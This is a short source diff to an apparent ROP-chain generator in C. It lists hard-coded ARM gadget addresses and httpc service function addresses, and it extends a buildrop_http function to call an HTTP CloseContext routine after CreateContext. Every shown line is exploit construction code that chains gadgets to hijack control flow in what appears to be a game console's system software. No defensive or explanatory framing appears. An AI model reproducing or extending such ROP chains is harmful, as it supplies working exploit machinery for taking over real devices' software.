@@ -55,6 +55,7 @@ u32 ROP_MOVR1R0_BXLR = 0x0013b23d;//"mov r1, r0" "bx lr"
 u32 ROP_ADDR0R0R3_POPR2R3R4R5R6PC = 0x00104eb1;//"adds r0, r0, r3" "pop {r2, r3, r4, r5, r6, pc}"
 
 u32 ROP_httpc_CreateContext = 0x001212d9;//inr0=_this inr1=url* inr2=u8 reqmethod inr3=flag. When flag is non-zero, use SetProxyDefault.
+u32 ROP_httpc_CloseContext = 0x00123d55;//inr0=_this
 
 u32 contentdatabuf_addr = 0x08032c00;//Unused memory near the end of the heap.
 
@@ -300,7 +301,11 @@ void buildrop_http(u32 *ropchain, u32 *ropvaddr, u32 ropchain_maxsize)
 
 	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_CreateContext, params);
 
-	ropgen_addword(&ropchain, ropvaddr, 0x20202020);
+	memset(params, 0, sizeof(params));
+	params[0] = httpctx;//r0 = _this
+	ropgen_callfunc(&ropchain, ropvaddr, ROP_httpc_CloseContext, params);
+
+	ropgen_addword(&ropchain, ropvaddr, 0x30303030);
 }
 
 int main(int argc, char **argv)
